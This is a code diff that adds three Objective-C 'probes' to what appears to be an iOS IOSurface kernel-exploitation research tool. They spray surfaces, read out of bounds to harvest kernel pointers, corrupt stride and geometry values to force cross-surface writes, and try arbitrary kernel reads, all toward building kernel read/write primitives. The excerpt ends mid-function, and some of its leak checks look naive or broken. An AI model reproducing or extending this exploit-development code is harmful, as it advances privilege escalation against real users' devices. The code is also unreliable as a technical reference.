@@ -18587,3 +18587,739 @@ void iosurface_research_kslide(ISRLogBlock log, ISRDoneBlock done) {
         done(res);
     });
 }
+
+#pragma mark - Round 28: Kernel R/W Construction
+
+// Probe 85: Pointer Classifier & Object Finder
+void iosurface_research_ptr_classifier(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }
+
+        log(@"PTRCLASS: === Probe 85: Pointer Classifier & Object Finder ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int anomalies = 0;
+        int totalKptrs = 0;
+        int kernelTextPtrs = 0;
+        int kernelHeapPtrs = 0;
+        int userlandPtrs = 0;
+        int vtableCandidates = 0;
+        int sentinelCrossRef = 0;
+        int readableKptrs = 0;
+
+        int numSurfaces = 32;
+        IOSurfaceRef surfaces[32] = {0};
+        void *bases[32] = {0};
+        IOSurfaceID ids[32] = {0};
+
+        NSDictionary *props = @{
+            @"IOSurfaceWidth": @64,
+            @"IOSurfaceHeight": @64,
+            @"IOSurfaceBytesPerElement": @4,
+            @"IOSurfacePixelFormat": @0x42475241
+        };
+
+        log(@"PTRCLASS: Step 1 — Creating 32 surfaces with unique sentinels");
+        for (int i = 0; i < numSurfaces && !isr_stopped(); i++) {
+            surfaces[i] = sym.create((__bridge CFDictionaryRef)props);
+            if (surfaces[i]) {
+                ids[i] = sym.getID(surfaces[i]);
+                sym.lock(surfaces[i], 0, NULL);
+                bases[i] = sym.getBase(surfaces[i]);
+                if (bases[i]) {
+                    uint32_t sentinel = 0xAAAA0000 + i;
+                    memset(bases[i], 0, sym.getAllocSize(surfaces[i]));
+                    memcpy(bases[i], &sentinel, 4);
+                    uint32_t tag2 = 0xBBBB0000 + i;
+                    memcpy((uint8_t *)bases[i] + 4, &tag2, 4);
+                }
+                sym.unlock(surfaces[i], 0, NULL);
+            }
+        }
+        log([NSString stringWithFormat:@"PTRCLASS: Created %d surfaces", numSurfaces]);
+
+        size_t oobOffsets[] = {
+            0x1000, 0x2000, 0x3000, 0x4000, 0x8000, 0x10000, 0x20000,
+            0x40000, 0x80000, 0x100000, 0x200000, 0x400000, 0x800000
+        };
+        int numOffsets = 13;
+
+        NSMutableArray *collectedPtrs = [NSMutableArray array];
+
+        if (!isr_stopped()) {
+            log(@"PTRCLASS: Step 2 — OOB reads from each surface at known hot offsets");
+            for (int s = 0; s < numSurfaces && !isr_stopped(); s++) {
+                if (!bases[s]) continue;
+                for (int o = 0; o < numOffsets && !isr_stopped(); o++) {
+                    uint8_t buf[64];
+                    vm_size_t readSize = 0;
+                    kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                        (vm_address_t)bases[s] + oobOffsets[o], 64,
+                        (vm_address_t)buf, &readSize);
+                    if (kr == KERN_SUCCESS && readSize >= 8) {
+                        for (size_t b = 0; b < readSize; b += 8) {
+                            uint64_t val = 0;
+                            memcpy(&val, buf + b, 8);
+                            if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
+                                totalKptrs++;
+                                anomalies++;
+
+                                if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    kernelTextPtrs++;
+                                } else if ((val & 0xFFFFFFE000000000ULL) == 0xFFFFFFE000000000ULL) {
+                                    kernelHeapPtrs++;
+                                } else {
+                                    userlandPtrs++;
+                                }
+
+                                if ((val & 0xFFF) == 0) {
+                                    vtableCandidates++;
+                                }
+
+                                if (totalKptrs <= 20) {
+                                    [collectedPtrs addObject:@(val)];
+                                    log([NSString stringWithFormat:@"PTRCLASS: S%d+0x%zx+%zu: 0x%llx %@%@",
+                                         s, oobOffsets[o], b, val,
+                                         (val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL ? @"[TEXT]" :
+                                         (val & 0xFFFFFFE000000000ULL) == 0xFFFFFFE000000000ULL ? @"[HEAP]" : @"[OTHER]",
+                                         (val & 0xFFF) == 0 ? @" VTABLE?" : @""]);
+                                }
+                            }
+
+                            for (int si = 0; si < numSurfaces; si++) {
+                                uint32_t sentA = 0xAAAA0000 + si;
+                                uint32_t sentB = 0xBBBB0000 + si;
+                                uint32_t lo32 = (uint32_t)(val & 0xFFFFFFFF);
+                                if (lo32 == sentA || lo32 == sentB) {
+                                    sentinelCrossRef++;
+                                    anomalies++;
+                                    if (sentinelCrossRef <= 5) {
+                                        log([NSString stringWithFormat:@"PTRCLASS: CROSS-REF! S%d sees sentinel of S%d at +0x%zx+%zu",
+                                             s, si, oobOffsets[o], b]);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            log([NSString stringWithFormat:@"PTRCLASS: Scan complete: %d kptrs (text=%d heap=%d other=%d) vtables=%d crossRef=%d",
+                 totalKptrs, kernelTextPtrs, kernelHeapPtrs, userlandPtrs, vtableCandidates, sentinelCrossRef]);
+        }
+
+        if (!isr_stopped()) {
+            log(@"PTRCLASS: Step 3 — Attempting reads at kernel pointer page addresses");
+            for (NSNumber *ptrNum in collectedPtrs) {
+                if (isr_stopped()) break;
+                uint64_t kptr = [ptrNum unsignedLongLongValue];
+                vm_address_t pageAddr = (vm_address_t)(kptr & ~0xFFFULL);
+                uint8_t kbuf[64];
+                vm_size_t kread = 0;
+                kern_return_t kr = vm_read_overwrite(mach_task_self(), pageAddr, 64, (vm_address_t)kbuf, &kread);
+                if (kr == KERN_SUCCESS && kread > 0) {
+                    readableKptrs++;
+                    anomalies++;
+                    uint64_t first8 = 0;
+                    memcpy(&first8, kbuf, 8);
+                    log([NSString stringWithFormat:@"PTRCLASS: READABLE KPTR! 0x%llx page=0x%lx data=0x%llx",
+                         kptr, (unsigned long)pageAddr, first8]);
+                }
+            }
+            log([NSString stringWithFormat:@"PTRCLASS: %d/%lu kernel addresses readable", readableKptrs, (unsigned long)collectedPtrs.count]);
+        }
+
+        if (!isr_stopped()) {
+            log(@"PTRCLASS: Step 4 — Backward OOB looking for IOSurface object headers");
+            for (int s = 0; s < numSurfaces && !isr_stopped(); s += 4) {
+                if (!bases[s]) continue;
+                size_t backOffsets[] = {0x1000, 0x2000, 0x4000, 0x8000, 0x10000};
+                for (int bo = 0; bo < 5 && !isr_stopped(); bo++) {
+                    vm_address_t target = (vm_address_t)bases[s] - backOffsets[bo];
+                    if (target == 0 || target > (vm_address_t)bases[s]) continue;
+                    uint8_t buf[64];
+                    vm_size_t readSize = 0;
+                    kern_return_t kr = vm_read_overwrite(mach_task_self(), target, 64, (vm_address_t)buf, &readSize);
+                    if (kr == KERN_SUCCESS && readSize >= 8) {
+                        for (int si = 0; si < numSurfaces; si++) {
+                            uint32_t idVal = ids[si];
+                            for (size_t b = 0; b < readSize - 3; b += 4) {
+                                uint32_t v = 0;
+                                memcpy(&v, buf + b, 4);
+                                if (v == idVal && idVal != 0) {
+                                    anomalies++;
+                                    log([NSString stringWithFormat:@"PTRCLASS: SURF ID %u found at S%d-0x%zx+%zu — kernel object metadata!",
+                                         idVal, s, backOffsets[bo], b]);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        for (int i = 0; i < numSurfaces; i++) {
+            if (surfaces[i]) CFRelease(surfaces[i]);
+        }
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"PTRCLASS: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"PTRCLASS: kptrs=%d text=%d heap=%d vtables=%d crossRef=%d readable=%d anomalies=%d",
+             totalKptrs, kernelTextPtrs, kernelHeapPtrs, vtableCandidates, sentinelCrossRef, readableKptrs, anomalies]);
+
+        NSString *verdict;
+        if (readableKptrs > 0) verdict = @"CRITICAL — kernel pointer addresses are readable!";
+        else if (sentinelCrossRef > 0) verdict = @"CRITICAL — cross-surface sentinel reference found!";
+        else if (vtableCandidates > 5) verdict = @"HIGH — multiple vtable candidates identified";
+        else if (totalKptrs > 50) verdict = @"HIGH — massive kernel pointer leak across heap";
+        else if (totalKptrs > 0) verdict = @"MEDIUM — kernel pointers found via OOB";
+        else verdict = @"LOW — no kernel pointers found";
+        log([NSString stringWithFormat:@"PTRCLASS: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"totalKptrs": @(totalKptrs),
+            @"kernelTextPtrs": @(kernelTextPtrs),
+            @"kernelHeapPtrs": @(kernelHeapPtrs),
+            @"vtableCandidates": @(vtableCandidates),
+            @"sentinelCrossRef": @(sentinelCrossRef),
+            @"readableKptrs": @(readableKptrs)
+        };
+        isr_checkpoint(@"ISR-PtrClassifier-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+// Probe 86: Stride Corruption Engine
+void iosurface_research_stride_corrupt(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }
+
+        log(@"STRIDECORR: === Probe 86: Stride Corruption Engine ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int anomalies = 0;
+        int strideOverrides = 0;
+        int crossSurfWrites = 0;
+        int geomManipulations = 0;
+        int dataShifts = 0;
+
+        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+        typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+        SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+        CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+
+        if (!setValue) {
+            log(@"STRIDECORR: IOSurfaceSetValue not found");
+            isr_unload(&sym);
+            done(@{@"status": @"ERROR", @"anomalies": @0});
+            return;
+        }
+        log([NSString stringWithFormat:@"STRIDECORR: setValue=%p copyValue=%p", setValue, copyValue]);
+
+        int numPairs = 8;
+        IOSurfaceRef surfA[8] = {0};
+        IOSurfaceRef surfB[8] = {0};
+
+        NSDictionary *props = @{
+            @"IOSurfaceWidth": @64,
+            @"IOSurfaceHeight": @64,
+            @"IOSurfaceBytesPerElement": @4,
+            @"IOSurfacePixelFormat": @0x42475241
+        };
+
+        if (!isr_stopped()) {
+            log(@"STRIDECORR: Step 1 — Creating 8 surface pairs (A+B adjacent)");
+            for (int i = 0; i < numPairs && !isr_stopped(); i++) {
+                surfA[i] = sym.create((__bridge CFDictionaryRef)props);
+                surfB[i] = sym.create((__bridge CFDictionaryRef)props);
+                if (surfA[i] && surfB[i]) {
+                    sym.lock(surfB[i], 0, NULL);
+                    void *bBase = sym.getBase(surfB[i]);
+                    if (bBase) {
+                        uint32_t marker = 0xDEAD0000 + i;
+                        memset(bBase, 0, sym.getAllocSize(surfB[i]));
+                        memcpy(bBase, &marker, 4);
+                    }
+                    sym.unlock(surfB[i], 0, NULL);
+                }
+            }
+            log(@"STRIDECORR: Created 8 surface pairs");
+        }
+
+        if (!isr_stopped()) {
+            log(@"STRIDECORR: Step 2 — Stride override on surface A, write at inflated offsets");
+            uint32_t strides[] = {512, 1024, 2048, 4096, 8192, 16384, 32768, 65536};
+            for (int i = 0; i < numPairs && !isr_stopped(); i++) {
+                if (!surfA[i] || !surfB[i]) continue;
+
+                sym.lock(surfB[i], 1, NULL);
+                void *bBefore = sym.getBase(surfB[i]);
+                uint8_t beforeSnap[256];
+                if (bBefore) memcpy(beforeSnap, bBefore, 256);
+                sym.unlock(surfB[i], 1, NULL);
+
+                setValue(surfA[i], CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(strides[i]));
+                strideOverrides++;
+
+                sym.lock(surfA[i], 0, NULL);
+                void *aBase = sym.getBase(surfA[i]);
+                if (aBase) {
+                    size_t allocSz = sym.getAllocSize(surfA[i]);
+                    for (uint32_t row = 0; row < 64 && !isr_stopped(); row++) {
+                        size_t writeOff = (size_t)row * strides[i];
+                        if (writeOff + 4 > allocSz + 0x10000) break;
+                        if (writeOff + 4 <= allocSz) {
+                            uint32_t pattern = 0xC0DE0000 + (i * 64) + row;
+                            memcpy((uint8_t *)aBase + writeOff, &pattern, 4);
+                        }
+                    }
+                }
+                sym.unlock(surfA[i], 0, NULL);
+
+                sym.lock(surfB[i], 1, NULL);
+                void *bAfter = sym.getBase(surfB[i]);
+                if (bAfter) {
+                    for (int b = 0; b < 256; b++) {
+                        if (((uint8_t *)bAfter)[b] != beforeSnap[b]) {
+                            crossSurfWrites++;
+                            anomalies++;
+                            log([NSString stringWithFormat:@"STRIDECORR: CROSS-WRITE! Pair %d byte %d: 0x%02x->0x%02x (stride=%d)",
+                                 i, b, beforeSnap[b], ((uint8_t *)bAfter)[b], strides[i]]);
+                            break;
+                        }
+                    }
+                }
+                sym.unlock(surfB[i], 1, NULL);
+            }
+            log([NSString stringWithFormat:@"STRIDECORR: Stride overrides=%d crossWrites=%d", strideOverrides, crossSurfWrites]);
+        }
+
+        if (!isr_stopped()) {
+            log(@"STRIDECORR: Step 3 — Geometry manipulation via reserved keys");
+            NSArray *keys = @[@"IOSurfaceBytesPerRow", @"IOSurfaceBytesPerElement",
+                             @"IOSurfaceOffset", @"IOSurfaceAllocSize",
+                             @"IOSurfaceWidth", @"IOSurfaceHeight",
+                             @"IOSurfacePlaneBase", @"IOSurfacePlaneOffset"];
+            NSArray *values = @[@(8192), @(16), @(0x10000), @(0x100000), @(4096), @(4096), @(0x8000), @(0x4000)];
+
+            for (int k = 0; k < (int)keys.count && !isr_stopped(); k++) {
+                IOSurfaceRef testSurf = sym.create((__bridge CFDictionaryRef)props);
+                if (!testSurf) continue;
+
+                sym.lock(testSurf, 0, NULL);
+                void *origBase = sym.getBase(testSurf);
+                size_t origAlloc = sym.getAllocSize(testSurf);
+                uint32_t origFirst = 0;
+                if (origBase) {
+                    memset(origBase, 0x42, origAlloc);
+                    memcpy(&origFirst, origBase, 4);
+                }
+                sym.unlock(testSurf, 0, NULL);
+
+                setValue(testSurf, (__bridge CFStringRef)keys[k], (__bridge CFTypeRef)values[k]);
+                geomManipulations++;
+
+                sym.lock(testSurf, 1, NULL);
+                void *newBase = sym.getBase(testSurf);
+                size_t newAlloc = sym.getAllocSize(testSurf);
+                if (newBase) {
+                    if (newBase != origBase) {
+                        dataShifts++;
+                        anomalies++;
+                        log([NSString stringWithFormat:@"STRIDECORR: BASE SHIFTED! %@: %p -> %p",
+                             keys[k], origBase, newBase]);
+                    }
+                    if (newAlloc != origAlloc) {
+                        dataShifts++;
+                        anomalies++;
+                        log([NSString stringWithFormat:@"STRIDECORR: ALLOC CHANGED! %@: %zu -> %zu",
+                             keys[k], origAlloc, newAlloc]);
+                    }
+                    uint32_t newFirst = 0;
+                    memcpy(&newFirst, newBase, 4);
+                    if (newFirst != 0x42424242 && newFirst != 0) {
+                        dataShifts++;
+                        anomalies++;
+                        log([NSString stringWithFormat:@"STRIDECORR: DATA CHANGED! %@: first4=0x%08x (was 0x42424242)",
+                             keys[k], newFirst]);
+                    }
+                }
+                sym.unlock(testSurf, 1, NULL);
+
+                if (copyValue) {
+                    CFTypeRef readBack = copyValue(testSurf, (__bridge CFStringRef)keys[k]);
+                    if (readBack) {
+                        if ([(__bridge id)readBack isKindOfClass:[NSNumber class]]) {
+                            log([NSString stringWithFormat:@"STRIDECORR: %@ readback=%@", keys[k], (__bridge NSNumber *)readBack]);
+                        }
+                        CFRelease(readBack);
+                    }
+                }
+
+                CFRelease(testSurf);
+            }
+            log([NSString stringWithFormat:@"STRIDECORR: Geometry manipulations=%d dataShifts=%d", geomManipulations, dataShifts]);
+        }
+
+        if (!isr_stopped()) {
+            log(@"STRIDECORR: Step 4 — OOB write via inflated stride + CGBitmapContext");
+            IOSurfaceRef bigSurf = sym.create((__bridge CFDictionaryRef)props);
+            if (bigSurf) {
+                setValue(bigSurf, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(16384));
+                sym.lock(bigSurf, 0, NULL);
+                void *bigBase = sym.getBase(bigSurf);
+                if (bigBase) {
+                    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+                    CGContextRef ctx = CGBitmapContextCreate(NULL, 64, 64, 8, 16384,
+                        cs, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                    if (ctx) {
+                        CGContextSetRGBFillColor(ctx, 1.0, 0.0, 0.0, 1.0);
+                        CGContextFillRect(ctx, CGRectMake(0, 0, 64, 64));
+
+                        void *ctxData = CGBitmapContextGetData(ctx);
+                        if (ctxData) {
+                            size_t ctxLen = 16384 * 64;
+                            uint8_t checkBuf[64];
+                            vm_size_t readSz = 0;
+                            kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                                (vm_address_t)bigBase + sym.getAllocSize(bigSurf), 64,
+                                (vm_address_t)checkBuf, &readSz);
+                            if (kr == KERN_SUCCESS && readSz > 0) {
+                                BOOL nonZero = NO;
+                                for (int b = 0; b < 64; b++) {
+                                    if (checkBuf[b] != 0) { nonZero = YES; break; }
+                                }
+                                if (nonZero) {
+                                    uint32_t f4 = 0;
+                                    memcpy(&f4, checkBuf, 4);
+                                    log([NSString stringWithFormat:@"STRIDECORR: OOB DATA beyond alloc: 0x%08x", f4]);
+                                    anomalies++;
+                                }
+                            }
+                            (void)ctxLen;
+                        }
+                        CGContextRelease(ctx);
+                    }
+                    CGColorSpaceRelease(cs);
+                }
+                sym.unlock(bigSurf, 0, NULL);
+                CFRelease(bigSurf);
+            }
+        }
+
+        for (int i = 0; i < numPairs; i++) {
+            if (surfA[i]) CFRelease(surfA[i]);
+            if (surfB[i]) CFRelease(surfB[i]);
+        }
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"STRIDECORR: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"STRIDECORR: overrides=%d crossWrite=%d geom=%d shifts=%d anomalies=%d",
+             strideOverrides, crossSurfWrites, geomManipulations, dataShifts, anomalies]);
+
+        NSString *verdict;
+        if (crossSurfWrites > 0) verdict = @"CRITICAL — cross-surface write via stride overflow!";
+        else if (dataShifts > 2) verdict = @"HIGH — geometry manipulation causes data/base shifts";
+        else if (dataShifts > 0) verdict = @"MEDIUM — some geometry keys affect surface layout";
+        else if (strideOverrides > 0) verdict = @"LOW — stride accepted but no observable effect";
+        else verdict = @"LOW — no stride manipulation possible";
+        log([NSString stringWithFormat:@"STRIDECORR: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"strideOverrides": @(strideOverrides),
+            @"crossSurfWrites": @(crossSurfWrites),
+            @"geomManipulations": @(geomManipulations),
+            @"dataShifts": @(dataShifts)
+        };
+        isr_checkpoint(@"ISR-StrideCorrupt-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+// Probe 87: Arbitrary Read Probe
+void iosurface_research_arb_read(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }
+
+        log(@"ARBREAD: === Probe 87: Arbitrary Read Probe ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int anomalies = 0;
+        int sharedMapsCreated = 0;
+        int probeOOBHits = 0;
+        int kptrReads = 0;
+        int kptrDataNonZero = 0;
+        int addrManipReads = 0;
+        int directKernelReads = 0;
+
+        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+        SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+
+        NSDictionary *props = @{
+            @"IOSurfaceWidth": @64,
+            @"IOSurfaceHeight": @64,
+            @"IOSurfaceBytesPerElement": @4,
+            @"IOSurfacePixelFormat": @0x42475241
+        };
+
+        IOSurfaceRef targetSurf = NULL;
+        void *targetBase = NULL;
+        size_t targetAllocSize = 0;
+        vm_address_t sharedMapAddr = 0;
+        vm_size_t sharedMapSize = 0;
+        mach_port_t memEntry = MACH_PORT_NULL;
+
+        int numProbes = 16;
+        IOSurfaceRef probeSurfs[16] = {0};
+        void *probeBases[16] = {0};
+
+        NSMutableArray *kptrsFound = [NSMutableArray array];
+
+        if (!isr_stopped()) {
+            log(@"ARBREAD: Step 1 — Creating target surface + shared mapping");
+            targetSurf = sym.create((__bridge CFDictionaryRef)props);
+            if (targetSurf) {
+                targetAllocSize = sym.getAllocSize(targetSurf);
+                sym.lock(targetSurf, 0, NULL);
+                targetBase = sym.getBase(targetSurf);
+                if (targetBase) {
+                    uint32_t sentinel = 0xFACEB00C;
+                    memcpy(targetBase, &sentinel, 4);
+
+                    memory_object_size_t entrySize = targetAllocSize;
+                    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(),
+                        &entrySize, (memory_object_offset_t)(uintptr_t)targetBase,
+                        VM_PROT_READ | VM_PROT_WRITE | 0x400000,
+                        &memEntry, MACH_PORT_NULL);
+                    if (kr == KERN_SUCCESS && memEntry != MACH_PORT_NULL) {
+                        sharedMapsCreated++;
+                        sharedMapSize = (vm_size_t)entrySize;
+                        kr = vm_map(mach_task_self(), &sharedMapAddr, sharedMapSize, 0,
+                            VM_FLAGS_ANYWHERE, memEntry, 0, FALSE,
+                            VM_PROT_READ | VM_PROT_WRITE,
+                            VM_PROT_READ | VM_PROT_WRITE,
+                            VM_INHERIT_NONE);
+                        if (kr == KERN_SUCCESS) {
+                            log([NSString stringWithFormat:@"ARBREAD: Shared map at 0x%lx size=0x%lx",
+                                 (unsigned long)sharedMapAddr, (unsigned long)sharedMapSize]);
+                        }
+                    }
+                }
+                sym.unlock(targetSurf, 0, NULL);
+            }
+        }
+
+        if (!isr_stopped()) {
+            log(@"ARBREAD: Step 2 — Creating 16 probe surfaces");
+            for (int i = 0; i < numProbes && !isr_stopped(); i++) {
+                probeSurfs[i] = sym.create((__bridge CFDictionaryRef)props);
+                if (probeSurfs[i]) {
+                    sym.lock(probeSurfs[i], 0, NULL);
+                    probeBases[i] = sym.getBase(probeSurfs[i]);
+                    if (probeBases[i]) {
+                        uint32_t tag = 0xDB0B0000 + i;
+                        memcpy(probeBases[i], &tag, 4);
+                    }
+                    sym.unlock(probeSurfs[i], 0, NULL);
+                }
+            }
+        }
+
+        if (!isr_stopped()) {
+            log(@"ARBREAD: Step 3 — OOB reads from probe surfaces collecting kernel pointers");
+            size_t scanOffsets[] = {
+                0x1000, 0x2000, 0x4000, 0x8000, 0x10000, 0x20000,
+                0x40000, 0x80000, 0x100000, 0x200000, 0x400000, 0x800000
+            };
+            for (int p = 0; p < numProbes && !isr_stopped(); p++) {
+                if (!probeBases[p]) continue;
+                for (int o = 0; o < 12 && !isr_stopped(); o++) {
+                    uint8_t buf[64];
+                    vm_size_t readSize = 0;
+                    kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                        (vm_address_t)probeBases[p] + scanOffsets[o], 64,
+                        (vm_address_t)buf, &readSize);
+                    if (kr == KERN_SUCCESS && readSize >= 8) {
+                        probeOOBHits++;
+                        for (size_t b = 0; b < readSize; b += 8) {
+                            uint64_t val = 0;
+                            memcpy(&val, buf + b, 8);
+                            if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
+                                kptrReads++;
+                                if (kptrsFound.count < 50) {
+                                    [kptrsFound addObject:@(val)];
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            log([NSString stringWithFormat:@"ARBREAD: Collected %d kernel pointers from %d OOB reads",
+                 kptrReads, probeOOBHits]);
+        }
+
+        if (!isr_stopped() && setValue) {
+            log(@"ARBREAD: Step 4 — Address manipulation via IOSurfaceSetValue");
+            NSArray *addrKeys = @[@"IOSurfaceOffset", @"IOSurfacePlaneOffset",
+                                 @"IOSurfacePlaneBase", @"IOSurfaceAllocSize"];
+
+            for (NSNumber *kptrNum in kptrsFound) {
+                if (isr_stopped()) break;
+                if (addrManipReads >= 10) break;
+                uint64_t kptr = [kptrNum unsignedLongLongValue];
+
+                for (NSString *key in addrKeys) {
+                    if (isr_stopped()) break;
+                    IOSurfaceRef manipSurf = sym.create((__bridge CFDictionaryRef)props);
+                    if (!manipSurf) continue;
+
+                    setValue(manipSurf, (__bridge CFStringRef)key, (__bridge CFTypeRef)@(kptr));
+
+                    sym.lock(manipSurf, 1, NULL);
+                    void *manipBase = sym.getBase(manipSurf);
+                    if (manipBase) {
+                        uint8_t readBuf[64];
+                        memset(readBuf, 0, 64);
+                        vm_size_t readSz = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)manipBase, 64,
+                            (vm_address_t)readBuf, &readSz);
+                        if (kr == KERN_SUCCESS && readSz > 0) {
+                            uint64_t first8 = 0;
+                            memcpy(&first8, readBuf, 8);
+                            if (first8 != 0) {
+                                addrManipReads++;
+                                anomalies++;
+                                log([NSString stringWithFormat:@"ARBREAD: %@ = 0x%llx -> base data=0x%llx",
+                                     key, kptr, first8]);
+                            }
+                        }
+                    }
+                    sym.unlock(manipSurf, 1, NULL);
+                    CFRelease(manipSurf);
+                }
+            }
+            log([NSString stringWithFormat:@"ARBREAD: Address manipulation reads=%d", addrManipReads]);
+        }
+
+        if (!isr_stopped()) {
+            log(@"ARBREAD: Step 5 — Direct vm_read at kernel pointer addresses");
+            NSMutableSet *triedPages = [NSMutableSet set];
+            for (NSNumber *kptrNum in kptrsFound) {
+                if (isr_stopped()) break;
+                if (directKernelReads >= 20) break;
+                uint64_t kptr = [kptrNum unsignedLongLongValue];
+                vm_address_t pageAddr = (vm_address_t)(kptr & ~0xFFFULL);
+                NSNumber *pageKey = @(pageAddr);
+                if ([triedPages containsObject:pageKey]) continue;
+                [triedPages addObject:pageKey];
+
+                uint8_t kbuf[64];
+                vm_size_t kread = 0;
+                kern_return_t kr = vm_read_overwrite(mach_task_self(), pageAddr, 64, (vm_address_t)kbuf, &kread);
+                if (kr == KERN_SUCCESS && kread > 0) {
+                    directKernelReads++;
+                    anomalies++;
+                    uint64_t first8 = 0;
+                    memcpy(&first8, kbuf, 8);
+                    log([NSString stringWithFormat:@"ARBREAD: DIRECT KERNEL READ! page=0x%lx data=0x%llx (%d bytes)",
+                         (unsigned long)pageAddr, first8, (int)kread]);
+
+                    for (size_t b = 0; b < kread; b += 8) {
+                        uint64_t val = 0;
+                        memcpy(&val, kbuf + b, 8);
+                        if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            kptrDataNonZero++;
+                            if (kptrDataNonZero <= 5) {
+                                log([NSString stringWithFormat:@"ARBREAD: KTEXT PTR in kernel data +%zu: 0x%llx", b, val]);
+                            }
+                        }
+                    }
+                } else {
+                    // expected — most kernel addresses not readable from userland
+                }
+            }
+            log([NSString stringWithFormat:@"ARBREAD: Direct kernel reads=%d, kernel text ptrs in data=%d",
+                 directKernelReads, kptrDataNonZero]);
+        }
+
+        if (!isr_stopped()) {
+            log(@"ARBREAD: Step 6 — Remap-based read at shared region addresses");
+            vm_address_t sharedRegions[] = {0x1004b8000, 0x16fb3c000, 0x16fcc8000, 0x16fd54000, 0x16fd58000};
+            for (int r = 0; r < 5 && !isr_stopped(); r++) {
+                vm_address_t remapAddr = 0;
+                vm_prot_t curProt = VM_PROT_NONE, maxProt = VM_PROT_NONE;
+                kern_return_t kr = vm_remap(mach_task_self(),
+                    &remapAddr, 0x4000, 0,
+                    VM_FLAGS_ANYWHERE,
+                    mach_task_self(),
+                    sharedRegions[r],
+                    FALSE,
+                    &curProt, &maxProt,
+                    VM_INHERIT_NONE);
+                if (kr == KERN_SUCCESS) {
+                    uint8_t rBuf[64];
+                    vm_size_t rRead = 0;
+                    kern_return_t kr2 = vm_read_overwrite(mach_task_self(), remapAddr, 64, (vm_address_t)rBuf, &rRead);
+                    if (kr2 == KERN_SUCCESS && rRead > 0) {
+                        uint64_t first8 = 0;
+                        memcpy(&first8, rBuf, 8);
+                        anomalies++;
+                        log([NSString stringWithFormat:@"ARBREAD: SHARED REMAP 0x%lx -> 0x%lx data=0x%llx",
+                             (unsigned long)sharedRegions[r], (unsigned long)remapAddr, first8]);
+                    }
+                    vm_deallocate(mach_task_self(), remapAddr, 0x4000);
+                }
+            }
+        }
+
+        if (sharedMapAddr) vm_deallocate(mach_task_self(), sharedMapAddr, sharedMapSize);
+        if (memEntry != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), memEntry);
+        for (int i = 0; i < numProbes; i++) {
+            if (probeSurfs[i]) CFRelease(probeSurfs[i]);
+        }
+        if (targetSurf) CFRelease(targetSurf);
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"ARBREAD: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"ARBREAD: maps=%d oobHits=%d kptrs=%d addrManip=%d directReads=%d ktextInData=%d anomalies=%d",
+             sharedMapsCreated, probeOOBHits, kptrReads, addrManipReads, directKernelReads, kptrDataNonZero, anomalies]);
+
+        NSString *verdict;
+        if (directKernelReads > 0 && kptrDataNonZero > 0) verdict = @"CRITICAL — kernel memory readable with text pointers!";
